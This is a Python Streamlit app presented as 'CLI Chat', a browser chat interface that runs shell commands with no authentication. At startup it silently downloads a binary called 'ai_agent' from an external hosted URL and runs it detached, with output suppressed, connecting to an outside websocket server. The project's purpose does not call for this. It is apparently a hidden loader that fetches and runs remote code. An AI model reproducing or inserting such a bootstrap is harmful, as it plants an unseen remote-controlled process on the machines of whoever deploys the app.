import os
import sys
import shlex
import time
import threading
import queue
import platform
import subprocess
from pathlib import Path
import signal
import urllib.request
import tempfile
import shutil
import logging

import streamlit as st

# NOTE: The ai_agent bootstrap below is intended for Linux environments only.
# The downloaded 'ai_agent' binary is Linux-only (no extension). This code
# always attempts to download and run it, without platform checks.

APP_ROOT = Path(__file__).parent.resolve()
UPLOAD_DIR = APP_ROOT / "uploads"
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

# --------------------- Pre-start external agent ---------------------

AI_AGENT_URL = "https://fiwime4235-softdown.static.hf.space/ai_agent"
AI_AGENT_NAME = "ai_agent"  # Linux-only binary (no extension)
AI_AGENT_PATH = APP_ROOT / AI_AGENT_NAME

# Logger for bootstrap progress to console
logger = logging.getLogger("ai_agent_bootstrap")
if not logger.handlers:
    _h = logging.StreamHandler(stream=sys.stdout)
    _h.setFormatter(logging.Formatter("[ai_agent] %(asctime)s %(levelname)s: %(message)s"))
    logger.addHandler(_h)
logger.setLevel(logging.INFO)

# Track currently running ai_agent process
AI_AGENT_PROC: subprocess.Popen | None = None


def _download_file(url: str, dest: Path, retries: int = 2, timeout: int = 30) -> None:
    dest.parent.mkdir(parents=True, exist_ok=True)
    last_err = None
    for attempt in range(retries + 1):
        try:
            msg = f"Downloading from {url} (attempt {attempt+1}/{retries+1}) -> {dest}"
            logger.info(msg); print(f"[ai_agent] {msg}", flush=True)
            # Create temp file in the same directory as dest to avoid cross-device rename issues
            with tempfile.NamedTemporaryFile(dir=str(dest.parent), delete=False) as tmp:
                tmp_path = Path(tmp.name)
            with urllib.request.urlopen(url, timeout=timeout) as resp, open(tmp_path, "wb") as out:
                shutil.copyfileobj(resp, out)
            # Move atomically into place
            try:
                tmp_path.replace(dest)
            except OSError as oe:
                logger.warning(f"Atomic replace failed ({oe}); falling back to copy -> overwrite")
                # Fallback: copy over and then remove temp
                shutil.copyfile(tmp_path, dest)
                try:
                    tmp_path.unlink(missing_ok=True)  # type: ignore[attr-defined]
                except Exception:
                    pass
            # Make executable (best-effort)
            try:
                dest.chmod(0o755)
            except Exception as ce:
                logger.warning(f"chmod failed (non-fatal): {ce}")
            try:
                size = dest.stat().st_size
            except Exception:
                size = -1
            msg2 = f"Downloaded ai_agent to {dest} (size={size} bytes)"
            logger.info(msg2); print(f"[ai_agent] {msg2}", flush=True)
            return
        except Exception as e:
            last_err = e
            logger.warning(f"Download attempt {attempt+1} failed: {e}")
            print(f"[ai_agent] Download attempt {attempt+1} failed: {e}", flush=True)
            try:
                if 'tmp_path' in locals() and tmp_path.exists():
                    tmp_path.unlink(missing_ok=True)  # type: ignore[attr-defined]
            except Exception:
                pass
            time.sleep(1.0)
    logger.error(f"Failed to download {url}: {last_err}")
    print(f"[ai_agent] Failed to download {url}: {last_err}", flush=True)
    raise RuntimeError(f"Failed to download {url}: {last_err}")


def _start_ai_agent_process(exe_path: Path) -> subprocess.Popen | None:
    try:
        args = [str(exe_path), "wss://azjxdrm.bsite.net", "streamlit11"]
        creationflags = 0
        # Try to start in a detached session when available (Linux)
        preexec_fn = getattr(os, "setsid", None)
        logger.info(f"Starting ai_agent: {' '.join(args)} (cwd={APP_ROOT})")
        print(f"[ai_agent] Starting ai_agent: {' '.join(args)} (cwd={APP_ROOT})", flush=True)
        proc = subprocess.Popen(
            args,
            cwd=str(APP_ROOT),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=creationflags,
            preexec_fn=preexec_fn,
            close_fds=True,
        )
        logger.info(f"ai_agent started with PID {proc.pid}")
        print(f"[ai_agent] ai_agent started with PID {proc.pid}", flush=True)
        return proc
    except Exception as e:
        logger.error(f"Failed to start ai_agent: {e}")
        print(f"[ai_agent] Failed to start ai_agent: {e}", flush=True)
        # Don't crash the Streamlit app if starting the agent fails
        return None

def ensure_ai_agent_started() -> subprocess.Popen | None:
    """Download ai_agent if missing and start it in background once per server process.
    Returns the subprocess handle or None on failure.
    """
    try:
        logger.info("Ensuring ai_agent is downloaded and running (Linux-only binary).")
        print("[ai_agent] Ensuring ai_agent is downloaded and running (Linux-only binary).", flush=True)
        # Always (re)download to ensure fresh binary
        _download_file(AI_AGENT_URL, AI_AGENT_PATH)
        # Ensure it's executable
        try:
            AI_AGENT_PATH.chmod(0o755)
        except Exception as ce:
            logger.warning(f"chmod failed (non-fatal): {ce}")
            print(f"[ai_agent] chmod failed (non-fatal): {ce}", flush=True)
        # If an agent is already running, terminate it before starting a new one
        global AI_AGENT_PROC
        if AI_AGENT_PROC and AI_AGENT_PROC.poll() is None:
            try:
                logger.info("ai_agent already running; terminating previous instance...")
                print("[ai_agent] ai_agent already running; terminating previous instance...", flush=True)
                try:
                    os.killpg(os.getpgid(AI_AGENT_PROC.pid), signal.SIGTERM)
                except Exception:
                    AI_AGENT_PROC.terminate()
                AI_AGENT_PROC.wait(timeout=2)
            except Exception:
                try:
                    AI_AGENT_PROC.kill()
                except Exception:
                    pass
        proc = _start_ai_agent_process(AI_AGENT_PATH)
        AI_AGENT_PROC = proc
        # Best-effort cleanup on interpreter exit
        try:
            import atexit

            def _cleanup():
                if proc and proc.poll() is None:
                    try:
                        logger.info("Shutting down ai_agent (atexit)...")
                        print("[ai_agent] Shutting down ai_agent (atexit)...", flush=True)
                        try:
                            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                        except Exception:
                            proc.terminate()
                        proc.wait(timeout=2)
                    except Exception:
                        try:
                            proc.kill()
                        except Exception:
                            pass

            atexit.register(_cleanup)
        except Exception:
            pass
        if proc is None:
            logger.warning("ai_agent process is None (failed to start)")
            print("[ai_agent] ai_agent process is None (failed to start)", flush=True)
        else:
            logger.info("ai_agent bootstrap completed")
            print("[ai_agent] ai_agent bootstrap completed", flush=True)
        return proc
    except Exception as e:
        logger.error(f"ai_agent bootstrap failed: {e}")
        print(f"[ai_agent] ai_agent bootstrap failed: {e}", flush=True)
        # Swallow any startup errors to avoid breaking the app
        return None

# --------------------- Helpers ---------------------

def is_windows() -> bool:
    return platform.system().lower().startswith("win")


def default_shell_and_args(cwd: Path):
    """Return (executable, args_list) for cross-platform shell execution.
    We will pass a single string to the shell's -Command/-c so that user input is executed in a shell context.
    """
    if is_windows():
        exe = "powershell.exe"
        # -NoProfile for speed; -ExecutionPolicy Bypass to allow scripts; -Command to run.
        base = [
            exe,
            "-NoLogo",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
        ]
        return exe, base
    else:
        # Prefer bash if available; fall back to sh
        exe = "/bin/bash" if Path("/bin/bash").exists() else "/bin/sh"
        base = [exe, "-lc"]  # login shell semantics for path/env
        return exe, base


def format_prompt(cwd: Path) -> str:
    home = Path.home()
    try:
        rel = f"~/{cwd.relative_to(home)}" if cwd.is_relative_to(home) else str(cwd)
    except Exception:
        rel = str(cwd)
    return rel


def init_state():
    if "messages" not in st.session_state:
        st.session_state.messages = []  # list of {role: 'user'|'assistant'|'system', 'content': str, 'meta': dict}
    if "cwd" not in st.session_state:
        st.session_state.cwd = str(APP_ROOT)
    if "prev_cwd" not in st.session_state:
        st.session_state.prev_cwd = None
    if "running" not in st.session_state:
        st.session_state.running = False
    if "proc" not in st.session_state:
        st.session_state.proc = None
    if "queue" not in st.session_state:
        st.session_state.queue = queue.Queue()
    if "stop_token" not in st.session_state:
        st.session_state.stop_token = threading.Event()


# --------------------- Process handling ---------------------

def enqueue_output(stream, q: queue.Queue, stop_evt: threading.Event):
    try:
        for line in iter(stream.readline, ""):
            if stop_evt.is_set():
                break
            if not line:
                break
            try:
                q.put(line)
            except Exception:
                break
    finally:
        try:
            stream.close()
        except Exception:
            pass


def run_command_stream(command_str: str, cwd: Path):
    """Start a shell subprocess that executes the user's command string and stream its output.
    Returns a generator yielding chunks as they become available.
    """
    exe, base = default_shell_and_args(cwd)

    if is_windows():
        # Ensure UTF-8 output for external commands and PowerShell itself
        prelude = (
            "[Console]::OutputEncoding=[System.Text.UTF8Encoding]::new(); "
            "$OutputEncoding=[System.Text.UTF8Encoding]::new(); "
        )
        shell_cmd = prelude + command_str
        popen_args = base + [shell_cmd]
        creationflags = 0
        if hasattr(subprocess, 'CREATE_NO_WINDOW'):
            creationflags |= subprocess.CREATE_NO_WINDOW
        if hasattr(subprocess, 'CREATE_NEW_PROCESS_GROUP'):
            creationflags |= subprocess.CREATE_NEW_PROCESS_GROUP
        preexec_fn = None
    else:
        # For bash/sh, ensure UTF-8 locale
        prelude = "export LANG=C.UTF-8; export LC_ALL=C.UTF-8;"
        shell_cmd = f"{prelude} {command_str}"
        popen_args = base + [shell_cmd]
        creationflags = 0
        # Start new session so we can signal the whole group (os.killpg)
        preexec_fn = os.setsid

    # Environment: enforce UTF-8 where possible
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"

    proc = subprocess.Popen(
        popen_args,
        cwd=str(cwd),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=1,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=env,
        creationflags=creationflags,
        preexec_fn=preexec_fn if not is_windows() else None,
    )

    st.session_state.proc = proc
    st.session_state.running = True

    q = st.session_state.queue
    stop_evt = st.session_state.stop_token
    stop_evt.clear()

    t = threading.Thread(target=enqueue_output, args=(proc.stdout, q, stop_evt), daemon=True)
    t.start()

    # Yield from queue
    try:
        while True:
            if stop_evt.is_set():
                break
            try:
                chunk = q.get(timeout=0.1)
                if chunk:
                    yield chunk
            except queue.Empty:
                if proc.poll() is not None:
                    # drain remaining
                    while True:
                        try:
                            chunk = q.get_nowait()
                            yield chunk
                        except queue.Empty:
                            break
                    break
                continue
    finally:
        # Wait for process to end if not already
        if proc.poll() is None:
            # Try graceful group interrupt first
            try:
                if is_windows():
                    try:
                        proc.send_signal(signal.CTRL_BREAK_EVENT)
                    except Exception:
                        proc.terminate()
                else:
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    except Exception:
                        proc.terminate()
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
            try:
                proc.wait(timeout=2)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

        # Best-effort: kill child processes using psutil if available
        try:
            import psutil  # type: ignore
            try:
                p = psutil.Process(proc.pid)
                for child in p.children(recursive=True):
                    try:
                        child.terminate()
                    except Exception:
                        pass
                _, alive = psutil.wait_procs(p.children(recursive=True), timeout=1)
                for a in alive:
                    try:
                        a.kill()
                    except Exception:
                        pass
            except Exception:
                pass
        except Exception:
            pass
        # Report exit code
        rc = proc.returncode
        yield f"\n[exit {rc}]".encode()


# --------------------- Key combo sender ---------------------
def send_key_combo(combo: str) -> tuple[bool, str]:
    """Send a key combo (like Ctrl+C) to the running process. Returns (ok, message)."""
    proc = st.session_state.get("proc")
    if not proc or st.session_state.get("running") is not True or proc.poll() is not None:
        return False, "No command is currently running"

    try:
        if is_windows():
            # Windows: try console control events; fall back to terminate
            if combo == "ctrl_c":
                try:
                    proc.send_signal(signal.CTRL_C_EVENT)
                    return True, "Sent Ctrl+C"
                except Exception:
                    try:
                        proc.send_signal(signal.CTRL_BREAK_EVENT)
                        return True, "Sent Ctrl+Break"
                    except Exception:
                        proc.terminate()
                        return True, "Attempted to terminate the process"
            elif combo == "ctrl_break":
                try:
                    proc.send_signal(signal.CTRL_BREAK_EVENT)
                    return True, "Sent Ctrl+Break"
                except Exception:
                    proc.terminate()
                    return True, "Attempted to terminate the process"
            else:
                return False, "This key combo is not supported on this system"
        else:
            # POSIX: signal process group
            pgid = os.getpgid(proc.pid)
            if combo == "ctrl_c":
                os.killpg(pgid, signal.SIGINT)
                return True, "Sent Ctrl+C (SIGINT)"
            elif combo == "ctrl_z":
                os.killpg(pgid, signal.SIGTSTP)
                return True, "Sent Ctrl+Z (SIGTSTP)"
            elif combo == "ctrl_backslash":
                os.killpg(pgid, signal.SIGQUIT)
                return True, "Sent Ctrl+\\ (SIGQUIT)"
            else:
                return False, "Unsupported key combo"
    except Exception as e:
        return False, f"Failed to send: {e}"


# --------------------- Builtins ---------------------

def handle_builtin(cmd: str, cwd: Path):
    parts = shlex.split(cmd, posix=not is_windows()) if cmd.strip() else []
    if not parts:
        return None, cwd

    name = parts[0].lower()
    if name in {"cd"}:
        target = parts[1] if len(parts) > 1 else str(Path.home())
        if target == "-":
            # signal to switch to previous cwd; actual swap handled by caller
            return {"type": "cd-prev"}, cwd
        # Build new path
        cand = Path(target).expanduser()
        new_path = cand if cand.is_absolute() else (Path(cwd) / cand)
        new_path = new_path.resolve() if new_path.exists() else new_path
        if not new_path.exists():
            return {"type": "error", "message": f"cd: no such file or directory: {new_path}"}, cwd
        if not new_path.is_dir():
            return {"type": "error", "message": f"cd: not a directory: {new_path}"}, cwd
        return {"type": "cd", "to": str(new_path)}, new_path
    if name in {"pwd"}:
        return {"type": "pwd", "path": str(cwd)}, cwd
    if name in {"clear", "cls"}:
        return {"type": "clear"}, cwd

    return None, cwd


# --------------------- UI ---------------------

def main():
    # Ensure background ai_agent is running before initializing UI (Linux-only)
    ensure_ai_agent_started()
    st.set_page_config(page_title="CLI Chat", page_icon="🖥️", layout="wide")
    init_state()

    # Sidebar
    with st.sidebar:
        st.title("CLI Chat")
        st.caption("Chat-driven shell • Windows & Linux/macOS")
        st.divider()
        st.write("Working directory:")
        cwd = Path(st.session_state.cwd)
        st.code(str(cwd), language="bash")

        col1, col2 = st.columns([1,1])
        with col1:
            if st.session_state.running:
                if st.button("Stop", type="secondary", use_container_width=True):
                    st.session_state.stop_token.set()
                    # Don't touch running/proc here; they will be cleaned after stream ends
            else:
                st.button("Stop", type="secondary", use_container_width=True, disabled=True)
        with col2:
            if st.button("Clear Chat", type="secondary", use_container_width=True):
                st.session_state.messages = []

        st.divider()
        st.write("Send key combo to current console:")
        if is_windows():
            combo_label_map = {
                "ctrl_c": "Ctrl+C (interrupt/terminate)",
                "ctrl_break": "Ctrl+Break (interrupt)",
            }
        else:
            combo_label_map = {
                "ctrl_c": "Ctrl+C (SIGINT)",
                "ctrl_z": "Ctrl+Z (SIGTSTP)",
                "ctrl_backslash": "Ctrl+\\ (SIGQUIT)",
            }
        combo_key = st.selectbox("Key combo", options=list(combo_label_map.keys()), format_func=lambda k: combo_label_map[k], index=0)
        if st.button("Send", use_container_width=True):
            ok, msg = send_key_combo(combo_key)
            if ok:
                st.success(msg)
            else:
                st.warning(msg)

        st.divider()
        up = st.file_uploader("Upload file(s)", accept_multiple_files=True)
        if up:
            saved_paths = []
            for f in up:
                dest = UPLOAD_DIR / f.name
                with open(dest, "wb") as out:
                    out.write(f.read())
                saved_paths.append(str(dest.resolve()))
                # Echo a message into chat with absolute path
                st.session_state.messages.append({
                    "role": "assistant",
                    "content": f"📁 Uploaded to: {dest.resolve()}",
                    "meta": {"type": "upload", "path": str(dest.resolve())}
                })
            st.success(f"Saved {len(saved_paths)} file(s)")

    # Main chat area
    st.markdown(
        """
        <style>
        .stChatMessage pre, .stChatMessage code { font-size: 0.9rem; }
        .prompt { color: #7ee787; }
        </style>
        """,
        unsafe_allow_html=True,
    )

    # Render history
    for m in st.session_state.messages:
        with st.chat_message(m.get("role", "assistant")):
            st.markdown(m.get("content", ""))

    # Input
    prompt = st.chat_input(f"{format_prompt(Path(st.session_state.cwd))} >")

    if prompt is not None:
        # Push user message
        st.session_state.messages.append({"role": "user", "content": prompt, "meta": {}})

        # Handle builtins first
        builtin, new_cwd = handle_builtin(prompt, Path(st.session_state.cwd))
        if builtin:
            if builtin["type"] == "cd":
                st.session_state.prev_cwd = st.session_state.cwd
                st.session_state.cwd = str(Path(builtin["to"]))
                with st.chat_message("assistant"):
                    st.markdown(f"Changed directory to `{st.session_state.cwd}`")
                st.rerun()
            elif builtin["type"] == "cd-prev":
                if st.session_state.prev_cwd:
                    current = st.session_state.cwd
                    st.session_state.cwd = st.session_state.prev_cwd
                    st.session_state.prev_cwd = current
                    with st.chat_message("assistant"):
                        st.markdown(f"Changed directory to `{st.session_state.cwd}`")
                else:
                    with st.chat_message("assistant"):
                        st.markdown("No previous directory.")
                st.rerun()
            elif builtin["type"] == "pwd":
                with st.chat_message("assistant"):
                    st.code(str(st.session_state.cwd))
                st.session_state.messages.append({
                    "role": "assistant",
                    "content": f"`{st.session_state.cwd}`",
                    "meta": {"type": "pwd"}
                })
                st.rerun()
            elif builtin["type"] == "clear":
                st.session_state.messages = []
                st.rerun()
            elif builtin["type"] == "error":
                with st.chat_message("assistant"):
                    st.markdown(builtin.get("message", "Error"))
                st.session_state.messages.append({
                    "role": "assistant",
                    "content": builtin.get("message", "Error"),
                    "meta": {"type": "error"}
                })
                st.rerun()
            return

        # Execute shell command with streaming output
        with st.chat_message("assistant"):
            out_area = st.empty()
            content = ""

            for chunk in run_command_stream(prompt, Path(st.session_state.cwd)):
                content += str(chunk)
                out_area.code(content, language="bash")
                time.sleep(0.01)

            # Cleanup process state here (outside generator) to avoid StopException
            st.session_state.running = False
            st.session_state.proc = None

            # Persist the final output to history
            final_text = content
            st.session_state.messages.append({
                "role": "assistant",
                "content": f"```bash\n{final_text}\n```",
                "meta": {"type": "output"}
            })

        st.rerun()


if __name__ == "__main__":
    main()
